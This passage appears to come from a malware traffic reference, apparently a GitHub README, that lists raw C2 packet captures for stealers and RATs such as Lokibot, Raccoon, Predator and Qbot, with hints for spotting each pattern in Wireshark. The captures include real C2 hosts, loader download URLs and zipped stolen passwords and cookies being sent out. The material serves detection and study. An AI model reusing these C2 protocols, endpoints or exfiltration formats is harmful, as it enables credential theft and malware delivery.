%Q"."	I.	:)n=<..(G?$7%n..*'E.	'.(_9'0%u
..qcE.1;.b~6;
4h;..z4_%)z}...Mxh
'&U^6..h>arqM3T[vy.Fmn\w.c{vM.h[~~.I`R_t
ZqsO.[Xvy8Z_7=.|...so_Zh.g9.YZv.`..HxS+
}.3.S-u..tw8z![~xq6a&I#Y>!+..Sb,!\.{..*.ZssK
h^}p.Ec\et.hqzL
Pb}x.FlQYw.iHpI.UQ~p.z.n<.w...+3&'.u.@d\_~.eH!.W.F-'___U_u.ZtpA.W^vB.@mWVr.bHpI.TQ{~.Cln\w.g{sA.hBDhm6."&.q...?.+$.
.P...%V50..I../<S,.
.5[#-%
e5. ,].&8,([;+&
e..9.z@.!=.f.l7.Mob.	.@fn..C"{2JT..=.|=x#=.m.r. V.^z-Z]...&Mc."1t._..`'<..%S?.7@V[Y4.m>
;.qSZ#7.T.F-'___V^s.d{qA.Vb}~.IgRYv.fHpI.SX{q.zfVZv.hpuI.h[~~.Ie\^M.Z..73SF.}.GmQ_s.`lrI.RZw{.Fd\\s.gsqL.ZF..x$$U#.ea.".W.<-x.z4..*@~!,..hZ.|.DlVWq.ZqtO.U_{{.@_W_..iqwI3QZ{x.Hm\Zu>cruN.RP.B.zu;).r...<f$...~5.^O.F1 !.K>	>8V.!.3
]30,
V....[.1..4h.-,.P....].	/;.b...N...:E8.4..Me";3..Q.}0m .>)&A.'9.P6'D.S.0..(_~!,..hQ|y.zfR^~.gwpO	h[~p.IfP_M.arwL.QZ|
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/kpot.png "Kpot stealer")

#### Lokibot

follw tcp stream, not http stream in wireshark
~~~
POST /sky/five/fre.php HTTP/1.0
User-Agent: Mozilla/4.08 (Charon; Inferno)
Host: fueda.info
Accept: */*
Content-Type: application/octet-stream
Content-Encoding: binary
Content-Key: 8DAA705A
Content-Length: 176
Connection: close

..'.......ckav.ru..
...a.d.m.i.n.......U.S.E.R.-.P.C.......U.S.E.R.-.P.C......................+................0...8.5.6.9.A.A.F.F.6.3.A.A.A.7.1.D.8.0.4.0.0.E.2.5.....Rqbay....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/lokibot.png "Lokibot")

#### MilkyBoy
~~~
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
User-Agent: Adzq41ceq52e353512hSfj
Content-Length: 45
Host: qqwveqwevqwe.duckdns.org:10

key:Adz32151295uy129v5nqwrnvqwkjn5rv12n5vhSfj

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 8593928
Server: Werkzeug/0.15.4 Python/2.7.6
Date: Wed, 09 Oct 2019 22:09:57 GMT

TVqQAAMAAAAEAAAA/

POST / HTTP/1.1
Host: qqwveqwevqwe.duckdns.org:10
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.11.1
key: Adz32516047vhSfj
filename: 58759853857.zip
Content-Length: 5334
Content-Type: multipart/form-data; boundary=80790cc2554f462cb375dcc301f5c66a

--80790cc2554f462cb375dcc301f5c66a
Content-Disposition: form-data; name="payload"; filename="payload"

PK........G.IO............
...PASSWORDS/PK........G.IO+&.6v...........e.txt=.I.. .....Wx./X....%......g[VN6A...z~......x}....xH......*b....<@.W.P..X......,|*.]$..
}..%.	.C{....7.W......Bas.....PK........I.IO................sys.txt].Ok.@....|..S...&jho.B..........R.[.OK(..].K.2.7.73o~...'..6D.>q....U..u.. .W..x.0....=.T.#...<0"....W.k.. .;..J1.q;X.{kz..S;_.f.t...D..Gh@......Q.v@G=}....m"...............Yy..!1U...i.xe...B.T%..	{5.....m...3.>....3.J..]Vh......&Y.@.8...T~1B!....l
kk.:......m$....B.._.E........PK........G.IO................PASSWORDS/CBase/PK........G.IO................PASSWORDS/FBase/PK........G.IO................PASSWORDS/CBase/Google/PK........G.IO).L
........#...PASSWORDS/CBase/Google/cookies.json....PK........G.IO".......[...)...PASSWORDS/CBase/Google/loginpasswords.txt...=..r..	-N-*.IL....q,(pI,I...ON..q..O.I.q.(..M..S.....%....U.g...x...Z.sy...2......(X).r.......
.d...V:....%...r.$.......d@|cS3...PK........G.IO."{.o...C..."...PASSWORDS/CBase/Google/webdata.txt...=..r..	-N-*.IL....q,(pI,I...ON..q..O.I.q.(..M..S.....%......&..x...V.cy..2..K..sS.....2Ss@..\>.P........b.0.PK........G.IO................PASSWORDS/FBase/Mozilla/PK........G.IOp.0.$.......$...PASSWORDS/FBase/Mozilla/cookies.json..Mk.@.....!......$......Vl$..~.......-..j-...R/s.y..}.....8..q.zm.[..n.~U..e).z..7.7..............
...^z.6..t#....(@W.r43...U.iT.-.....%6.....1......}5......iG..Ut.i|".I....$...~...Q.yr_.....tA."..
@.p...',.!O!e..T.v.6..T.hEY*..H..Sq)....L......~...CD....E.0..Sa.T	..`b.J*i...G..."xpF.......PK........o.)M0..W............PASSWORDS/FBase
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/milkyboy-1.png "Milkyboy 1")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/milkyboy-2.png "Milkyboy 2")

#### Nanocore

flag on "38 00 00 00 17" pattern
~~~
00000000  38 00 00 00 17 f5 4b 2c c3 65 ca 9f eb bc fd 67   8.....K, .e.....g
00000010  ad 6d 0e c4 33 7d b6 40 17 17 97 a1 d9 7c 3c b3   .m..3}.@ .....|<.
00000020  04 ea d0 16 f2 cf 3e 51 29 18 55 e5 1c 7a 6a 91   ......>Q ).U..zj.
00000030  03 99 38 f7 ac 3b f7 89 85 2e c4 d8               ..8..;.. ....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-38.png "Nanocore 38")

flag on "40 00 00 00 17" pattern:
~~~
00000000  40 00 00 00 17 f5 4b 2c c3 65 ca 9f eb bc fd 67   @.....K, .e.....g
00000010  ad 6d 0e c4 33 7d b6 40 17 17 97 a1 d9 7c 3c b3   .m..3}.@ .....|<.
00000020  04 ea d0 16 87 30 8f fa 78 9d 2a 01 c2 51 ee 07   .....0.. x.*..Q..
00000030  bd e7 23 95 3e ab a1 04 ca 56 b3 fb b7 9b b7 3a   ..#.>... .V.....:
00000040  13 e5 2b 52                                        ..+R
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nanocore-40.png "Nanocore 40")

#### Netwire
flag on "41 00 00 00 99" pattern in initial packet
~~~
00000000  41 00 00 00 99 80 3a e0 e8 5f d7 ea 8c af 76 cc   A.....:. ._....v.
00000010  c4 cc ad 5a 10 72 cc d0 5e 64 d8 50 80 fc b6 e6   ...Z.r.. ^d.P....
00000020  54 25 bf e0 ea 7f 7b e4 ff 54 70 e8 eb c0 fa 80   T%....{. .Tp.....
00000030  a0 a0 f3 a0 b0 0a 94 04 84 31 7c 3f e7 8c 90 c5   ........ .1|?....
00000040  ce c4 11 97 d9                                     .....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/netwire.png "Netwire 40")

#### Neutrino
~~~
POST /panel/52/tasks.php HTTP/1.0
Host: slipcentral.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0
Content-type: application/x-www-form-urlencoded
Cookie: auth=bc00595440e801f8a5d2a2ad13b9791b
Content-length: 180

_wv=Y21kJjkwMDU5YzM3LTEzMjAtNDFhNC1iNThkLTJiNzVhOTg1MGQyZiZZV1J0YVc0Z09pQlZVMFZTTFZCRElEb2dWVk5GVWkxUVF3JTNEJTNEJldpbmRvd3MlMjA3JTIwKDMyLWJpdCkmMCZOJTJGQSY1LjEmMDguMTAuMjAxOSZOT05FHTTP/1.0 404 Not Found
Connection: close
X-Powered-By: PHP/5.6.40
Content-Type: text/html; charset=UTF-8
Content-Length: 1251
Date: Tue, 08 Oct 2019 00:52:53 GMT
Server: LiteSpeed
Vary: User-Agent

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /panel/52/tasks.php was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html><!---MTU3MDI2MTQzNjkyODM2MyNyYXRlIDUjMTQ2MzAyMDA2NjUxNjE2OSNzY3JlZW5zaG90IzE0NjkxMDAwOTY4ODIwMDAjYm90a2lsbGVyIzE1NzAyNjMxNzk5MTUwMDAjTE9BREVSIGh0dHA6Ly9zbGlwY2VudHJhbC5jb20vcGFuZWwvNTIvdXBsb2FkL2twKDEpLmV4ZSBydW4jMTU3MDI1OTIyNTI4Njg5NCNGSU5EICUyQWRhdCUyQSMxNTcwMjYyMjA3Njc0NDQzI0NNRC1SZXN1bHQgaXBjb25maWcjMTU3MDI2MzE4ODkxMzkyOCNETlMgaHR0cDovL3NsaXBjZW50cmFsLmNvbS9wYW5lbC81Mi91cGxvYWQveHNsYXllciBjdnYgY2hlY2tlci5leGUgcnVuIzE1NzAyNjM3NzM3MjkxNjUjRklORCB0eHQjMTU3MDI2Mzc4MDYwOTkwNCNGSU5EIGpwZyMxNTcwMjYyMjA3ODg2MjAwI0NNRC1SZXN1bHQgaXBjb25maWcjMTU3MDI2MjMwNDMzOTAxNyNGSU5EIHdlYmluamVjdHMudHh0IzE1NzAyNjI1MTM0ODkxMDYjRklORCAlNUMlMjZxdW90JTNCdHh0JTVDJTI2cXVvdCUzQiMxNTcwMjYzMzQxNzU4MzE3I0xPQURFUiBodHRwOi8vc2xpcGNlbnRyYWwuY29tL3BhbmVsLzUyL3VwbG9hZC96ZXVzIGNhbmFkYS5leGUgcnVuIzE1NzAyNzM4OTk0MTc4NTMjQ01ELVJlc3VsdCBwc2xpc3QjMTU3MDI3Mjk4MTIxNDQ0NSNDTUQtUmVzdWx0IHBzbGlzdCMxNTcwMjYzNzI2NjY5NzcyI0NNRC1SZXN1bHQgdGFza2xpc3Qj--->
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/neutrino.png "Neutrino")

#### Orcus RAT
Machine name is SNI
~~~
....j...f..].....*".....L...^...xG.F..... ...../.5...
.....	.
.2.8.......%..........
...USER-PC.
......................M..]......~$....q.....d..o..t{8Y..& V5.....Xj..[...d.'v...3Y..9...}.....................0...0..0.......GY.I..l.C.!d.((n0
.	*.H..
.....0!1.0...U....OrcusServerCertificate0 .
181004205345Z..20691004205345Z0!1.0...U....OrcusServerCertificate0..0
.	*.H..
.........0..........C.}q.
.%/.J..U..+U!...Zk.&5.".	.on......w..NA..n..... ...ZM!...g..]....]Z...,
~h..?.......i'........u..... .r.|.o....2..A1KU.....0
.	*.H..
...........}.#zu....*...eW.+..c8..qk^.8....F..S"u.:..=...C  .K.z....P...Y..M[..d.2p..U....O=.|*4-....S;.b...I......1t.~Z..e.ETxk...r(u_g........a...?.y$t..LR.:..>...3j..gT		.....DJH..N.MJD.eb...I...}.V^5a...\@.S..........4..u_...l$y....k*......|...D..Z
.8S...i..z.9.&..5F.......A..V.c\.{..I...1|.W..td?...Y.....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/orcus.png "Orcus RAT")

#### Ostap
~~~
POST /angola/mabutu.php?pi=29h&tan=cezar&z=662343339&n=0&u=20&an=9468863238 HTTP/1.1
Connection: Keep-Alive
Content-Type: text/plain; Charset=UTF-8
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
Content-Length: 1034
Host: 185.180.199.91

Microsoft Windows 7 Professional 6.1.7601*Locale:0409
C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sent64.jse
USER-PC*DELL*DELL*0

System Idle Process*null
System*null
smss.exe*null
csrss.exe*null
wininit.exe*null
csrss.exe*null
winlogon.exe*null
services.exe*null
lsass.exe*null
lsm.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
spoolsv.exe*null
svchost.exe*null
svchost.exe*null
svchost.exe*null
dwm.exe*C:\Windows\system32\Dwm.exe
explorer.exe*C:\Windows\Explorer.EXE
taskhost.exe*C:\Windows\system32\taskhost.exe
SearchIndexer.exe*null
qemu-ga.exe*null
audiodg.exe*null
WmiPrvSE.exe*null
SearchProtocolHost.exe*null
windanr.exe*C:\Windows\system32\windanr.exe
OSPPSVC.EXE*null
wscript.exe*C:\Windows\system32\wscript.exe
wscript.exe*C:\Windows\system32\wscript.exe
SearchFilterHost.exe*null
WINWORD.EXE*C:\Program Files\Microsoft Office\Office14\WINWORD.EXE
WmiPrvSE.exe*null
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ostap-1.png "Ostap")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ostap-2.png "Ostap")

#### Pony
Follow tcp stream, not http stream in wireshark
~~~
POST /mlu/forum.php HTTP/1.0
Host: spausence.com
Accept: */*
Accept-Encoding: identity, *;q=0
Accept-Language: en-US
Content-Length: 369
Content-Type: application/octet-stream
Connection: close
Content-Encoding: binary
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)

..|Rk.. ."6d0..)/.....Lo..l{;..:.NJT;.G..3P..n...{.i..eLX..j...K.N.......A.
n.%.....r..&..........J.l.V..of..T..V$... .L...5....6F...9.)......(...
.(O........*[z\.....N....=..4..];....L.W......Q...*.S....V.	7.4.L..v..oi...x..W7....{.....V)...:...1...R..V.......+...]m 
.......B...|D..t.Y.{..............{W.f.._i...i.!..d.C...r.......A.,.z....ta..m..
5!...w+.....p....!0

HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Thu, 03 Oct 2019 17:17:59 GMT
Content-Type: text/html
Connection: close
X-Powered-By: PHP/5.4.45

..
.....f>k.X.......
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pony.png "Pony")

#### Predator the Thief
~~~
POST /api/check.get HTTP/1.1
Content-Type: text/html
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.906.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Host: 95.215.205.56
Content-Length: 0
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Wed, 09 Oct 2019 20:05:42 GMT
Server: Apache
Set-Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404; expires=Thu, 10-Oct-2019 20:05:42 GMT; Max-Age=86400; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 132
Keep-Alive: timeout=10, max=100
Connection: Keep-Alive
Content-Type: text/plain; charset=utf-8

nr8uEQylGUpuY0Qjyde/Fn3TGzRg6JFXvSXGhXxBL0Ls2eMYLaWSpJIvp6bRuCqmkclDgfyfYtc7/hQGxqKlJiPdCQ0v/JyN12lNiho7IjBLW3VB02orxGMXTr04WaAQz73q

HTTP/1.1 200 OK
Date: Wed, 09 Oct 2019 20:05:42 GMT
Server: Apache
Set-Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404; expires=Thu, 10-Oct-2019 20:05:42 GMT; Max-Age=86400; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 132
Keep-Alive: timeout=10, max=100
Connection: Keep-Alive
Content-Type: text/plain; charset=utf-8

nr8uEQylGUpuY0Qjyde/Fn3TGzRg6JFXvSXGhXxBL0Ls2eMYLaWSpJIvp6bRuCqmkclDgfyfYtc7/hQGxqKlJiPdCQ0v/JyN12lNiho7IjBLW3VB02orxGMXTr04WaAQz73qPOST /api/gate.get?p1=2&p2=5&p3=0&p4=2&p5=0&p6=0&p7=0&p8=0&p9=0&p10=udh8T1P6VQh1ZF9DgIniQjWRSWBTqqYq5k2u HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------228
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.906.121 Safari/537.36
Host: 95.215.205.56
Content-Length: 6028
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: SID_INTERFICE=4c616d7fffe95fe8fc2f4f46d272c8a0412c1404

-----------------------------228
Content-Disposition: form-data; name="file"; filename="s7q3q0u1v7q3q0u1v7.zip"
Content-Type: application/octet-stream

PK..........IO................Outlook/UT
...K.].K.].K.]PK..........IOo...?...F.......Outlook/Outlook.txtUT
...K.].K.].K.]s.M...R...K.t(./.K..e..
H,.../J.......f@.`...+.CK#=C3.=C=C../..PK..........IO................General/UT
...K.].K.].K.]PK..........IO................Cookies/UT
...K.].K.].K.]PK..........IO................History/UT
...K.].K.].K.]PK..........IO................Other/UT
...K.].K.].K.]PK..........IOa.qZ............History/Chrome_0.txtUT
...K.].K.].K.].V[k.8.~..?.............B...>..,{D4.V....?..e..4M.M...`....s...O....3..b%....0.
7.'_.;s6.H}6.kZ.Fz........i...aZ...".".v.P.x>PR.[.D...$Q..."...%
f...Y.[.V.......G.*"...Ig..Y...k=}..}..U....@....T..n.-)7Z.Yt..%...$.P.vQ....p.z..&..t...P[...w...T....6A..!k...:...V...Fp.....-.a.....7......_.X...E../;..T8..7.I..)Y..(..,....)JP..........nf..g..E.\..(..@..XQ.l....".e..a.X .H.?*.".a.F9`..~zrzr..	.M......
.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/predator.png "Predator")

#### Qbot
usually url is /t3
~~~
POST /t3 HTTP/1.1
Accept: application/x-shockwave-flash, image/gif, image/jpeg, image/pjpeg, */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: 174.48.72.160
Content-Length: 215
Cache-Control: no-cache

ycgizbarun=8e5ygoO+WS2h/ypd2ZEi8nHeEKPFyrdKrXgLyQd6Gi76j4KxXuMEm2K/lEHrTJqqWdDWXZQWcLyTbSnECgNFerjMjb9ittXV+rg/yqpLMLtOWYw6pCz2nDkPbGnUW3Z61/yZoSoh9zdJzkpTmYMCloxmblZ9Eos4QZHsiMecjlcmNjwU1D/9ShQ6cGKSJxHNVT2lNGCykNU=

HTTP/1.1 200 OK
Server: nginx/1.9.12
Content-Length: 41

ParseHttpResponse() failed pCurlResp=NULL
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/qbot.png "Qbot Qakbot")

#### Quasar RAT
Flag on "40 00 00 00" pattern, 68 data bytes on first packet
~~~
00000000  40 00 00 00 3e 83 58 08 ad d1 05 8d 77 20 53 1f   @...>.X. ....w S.
00000010  dc 2e e8 99 0a f3 f1 bb 3a 8c c2 a1 9d 72 4a 69   ........ :....rJi
00000020  e6 60 97 da 1e 76 87 16 91 f2 1b c4 f4 89 f9 8a   .`...v.. ........
00000030  20 5b 19 e5 7c ae ed f1 b4 5a d2 ce 5f 86 17 20    [..|... .Z.._.. 
00000040  c6 b3 03 8c                                        ....
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/quasar.png "Quasar")

#### Raccoon Stealer
~~~
POST /gate/log.php HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 155
Host: 35.189.105.242

params=Ym90X2lkPTkwMDU5QzM3LTEzMjAtNDFBNC1CNThELTJCNzVBOTg1MEQyRl9hZG1pbiZjb25maWdfaWQ9NGVkZTQxZmUwZWE5NjMwMzRhM2Q2NWYwZGQ0NDJkZTQ2NzFjMjE0ZiZkYXRhPW51bGw=HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 30 Sep 2019 19:36:57 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Access-Control-Allow-Origin: *

{"url":"http://35.189.105.242/file_handler/file.php?hash=559f10a49e5f74c12b67d2b61c0dea701f752e43&js=cbe0dbfb63ca8503c1938fc9cdd5f5f3818d81b9&callback=http://35.189.105.242/gate","attachment_url":"http://35.189.105.242/gate/sqlite3.dll","libraries":"http://35.189.105.242/gate/libs.zip","ip":"89.187.165.57","config":{"masks":null,"loader_urls":["https://mygift.space/download/beam.exe"]},"is_screen_enabled":0,"is_history_enabled":0}HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 30 Sep 2019 19:36:57 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Access-Control-Allow-Origin: *

{"url":"http://35.189.105.242/file_handler/file.php?hash=559f10a49e5f74c12b67d2b61c0dea701f752e43&js=cbe0dbfb63ca8503c1938fc9cdd5f5f3818d81b9&callback=http://35.189.105.242/gate","attachment_url":"http://35.189.105.242/gate/sqlite3.dll","libraries":"http://35.189.105.242/gate/libs.zip","ip":"89.187.165.57","config":{"masks":null,"loader_urls":["https://mygift.space/download/beam.exe"]},"is_screen_enabled":0,"is_history_enabled":0}POST /file_handler/file.php?hash=559f10a49e5f74c12b67d2b61c0dea701f752e43&js=cbe0dbfb63ca8503c1938fc9cdd5f5f3818d81b9&callback=http://35.189.105.242/gate HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: multipart/form-data, boundary=Jfbvjwj3489078yuyetu
Content-Length: 2152
Host: 35.189.105.242

._=
--Jfbvjwj3489078yuyetu
content-disposition: form-data; name="file"; filename="data.zip"
Content-Type: application/octet-stream

PK..........>O..5kf.......
...passwords.txtUT
..`Y.]ZY.]ZY.]..w..Rp..O.IUp.(..M......
f....[.....%&.&..g.%....r........R+.
.K@..\....P....bcS3^.^.`..n.E.n..0.I2..PK..........>O"..:............browsers/firefox_cookie.txtUT
..`Y.]`Y.]`Y.]..KK.@...S.O.8..+.. .+..kJ6a..!.	mb...T.qQ......
.@...:.,m..y....
a...RK.
.......]w.\.U.k...L<..........s.m...|..9=.].l..0...7W...zY..mi....e...........di"..|M.t2...T..E...6.RI...dB.-s..c<.c.......;.r..E....tr.[..
......g@..X....^.Dl.`W.?.YQ.o...F...$\..K..v..+..." 0.|.PK..........>O................browsers/firefox_urls.txtUT
..`Y.]`Y.]`Y.]..K..0...=	w....>hI....4..(h.lI[.zz....v7.........s.......}.MS...@kd_.n........Vw.e.
........H1%.@.8._..A.+\.U._.O.....,C1..q..tj.......'......`..c_.+.Z.N...(2,....|..	8.vd.f.p.1.,y..PK..........>O.JJ.:...Z.......browsers/chrome_autofill.txtUT
..ZY.]ZY.]ZY.]s./.U.K.M.Rp.,*...2y..@.e.9.@a.......^..0D.O"6.A.)E.... ..PK..........>O..GMN...|.......mails/outlook.txtUT
..eY.]eY.]eY.]..
	P.N-*K-.2.4.34..3.3..
..0.*.....c....Z.P._.....U.Z.T.M" ...<.(."Y......r..PK..........>O..DH....o.......System Info.txtUT
..eY.]eY.]eY.]mR]k.0.}^ ..>&.6.l..`0'Y..f.$...(.....d$;k..'ws)ez.:..su?~.D][k.....~A.W.3...F....Qx..d.+-...Vi..bn...?.K..<e.2`......M........2NH0.%OrNJ..N..v..5....\%yD.F..Vi...u..yV.EF...^..2..t......'..........5|.!..G.
s.C9.>..V...;...K ^..x..P.1-....8.G..2...pE..<........Y.........?..".~.5....c.F|........0..u8;....h..2..	X....g..a"..|.>T;.IV$.[.,[...{...c..
. ...f.e.y...%k.[-.@.U..C7?.yX.a.p..o*.8.6..PI.v..7.......Tm.y..?PK............>O..5kf.......
.	....... .......passwords.txtUT...`Y.]PK............>O"..:..........	....... .......browsers/firefox_cookie.txtUT...`Y.]PK............>O..............	....... .......browsers/firefox_urls.txtUT...`Y.]PK............>O.JJ.:...Z.....	....... .......browsers/chrome_autofill.txtUT...ZY.]PK............>O..GMN...|.....	....... ...~...mails/outlook.txtUT...eY.]PK............>O..DH....o.....	....... .......System Info.txtUT...eY.]PK....................
--Jfbvjwj3489078yuyetu--HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 30 Sep 2019 19:37:10 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Access-Control-Allow-Origin: *

true"success"
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raccoon-1.png "Predator")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raccoon-2.png "Predator")

#### Revenge RAT
~~~
InformationRevenge-RATUEVSRElSRevenge-RATX0M0QkEzNjQ3Revenge-RAT192.168.100.213Revenge-RATVVNFUi1QQyAvIGFkbWluRevenge-RATNoRevenge-RATTWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwgIDMyRevenge-RATSW50ZWwoUikgQ29yZShUTSkgaTUtNjQwMCBDUFUgQCAyLjcwR0h6Revenge-RAT3757686784Revenge-RATTi9BRevenge-RATTi9BRevenge-RAT1000Revenge-RATTWljcm9zb2Z0IFBvd2VyUG9pbnQ=Revenge-RATZW4tVVM=Revenge-RATFalse*-]NK[-*
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/revenge.png "Rvenge RAT")

#### RMS RAT
~~~
...........<?xml version="1.0" encoding="UTF-8"?>
<rman_message version="67002"><code>1</code><string_param></string_param><string_param_2></string_param_2><int_param>1</int_param><data>77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxyb21fdmVyc2lvbiB2ZXJzaW9uPSI2NzAwMiI+PHByb2R1Y3Q+Uk1TPC9wcm9kdWN0Pjx2ZXJzaW9uPjY3MDAyPC92ZXJzaW9uPjx0ZXh0X3ZlcnNpb24+Ni43LjAuMjwvdGV4dF92ZXJzaW9uPjxiZXRhX3ZlcnNpb24+MDwvYmV0YV92ZXJzaW9uPjxwcm90b2NvbF92ZXJzaW9uPjU8L3Byb3RvY29sX3ZlcnNpb24+PGtpbmQ+MTwva2luZD48aWQ+NDAwLTYyMi05OTItNzg5PC9pZD48ZGV2aWNlX25hbWU+VXNlci1QQzwvZGV2aWNlX25hbWU+PGNvdW50cnlfY29kZT4yNDQ8L2NvdW50cnlfY29kZT48dXNlcl9kYXRhPjNGNEY1QTZDQjk1MDQ3RkVBNjEwMkJEN0QyMjI2QUE5PC91c2VyX2RhdGE+PHN5c3RlbV9oYXNoPjA4Q0FDN0UyNTQ0MTMzRjNBODIzMEZENUY5MzM0QkMzMUFEQTY5NkVFNUYzMzczQjVEODUzMzZCNTcxRDRFRkQ5MEVGQjU5NzJFRUNFMzg3N0M3QUNENDUyODBGRUJCQTJCMjMzMDZCOENDRkYwRDhDNUUyOTJCQ0M3OEY2MjAzPC9zeXN0ZW1faGFzaD48c3luY19kYXRhPkM4Q0VBOEJBRDQxODFBMjFBNDU4QzVGNkU1MTIwN0Y0PC9zeW5jX2RhdGE+PHJhdGlvPjA8L3JhdGlvPjx0cmlhbF9zdGF0ZT4wPC90cmlhbF9zdGF0ZT48YnBoX3ZlcnNpb24+ZmFsc2U8L2JwaF92ZXJzaW9uPjxsaWNlbnNlX2tleT48L2xpY2Vuc2Vfa2V5PjxkYXlzX2xlZnQ+MDwvZGF5c19sZWZ0Pjwvcm9tX3ZlcnNpb24+DQo=</data></rman_message>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/rms.png "RMS RAT")

#### Servhelper
~~~
POST /like/s.php HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded; charset=utf-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Content-Length: 376
Host: laph.icu

key=%00%00%04%03%1B%00%1B&sysid=%06%1A%18%5EX%2B%3B%06%1A%08%00%03%1FOCL%3C%11%1E%19%1D%0F%0AT%3C%0E%17%07OELG%22%09%1D%07%05%00%1ALYZ%5DCT.%1A%1D%00%0BT%5BYD%5DCTZ%5BY%0E%06%00L*%10%05%1B%1D%03%01%5D3%17BX0%01%1F%0A%06%02%0E%19%09UT9%3C1%3EB%24%2FK%2B%1B%06%1A%0D%0C%17V%18%13%0D%1A%00%05%03%15%0F%0CO%21%3AB%5B%05%1A%27%3AO3Z%40TY%40&resp=%03%04&rights=%0A%09%12%0A%09&misc=
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/servhelper.png "ServHelper")

#### Smokeloader
~~~
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: http://thankg1.org/
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Content-Length: 299
Host: thankg1.org

..ngl$j.N...$.=\..98h...8..XO.(3ET]...p1.Z.Q.....GI.1R..j6......NF`&....."5..V.~...#.,w......\N.V`.gI..0&.
.N.Z...%.b.....V..3H....t..6w.....7.0..
..+.........O..`...4..A..wT.F...XM&2.^.Y................E.4	W`.......(.....<,.zK..>c..^...p......n.z"]....\S,[.
......qV4`..Pu*...8W.........M .h.v.S.:.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/smokeloader.png "Smokeloader")

#### TA505 Loader:
~~~
POST /2021 HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
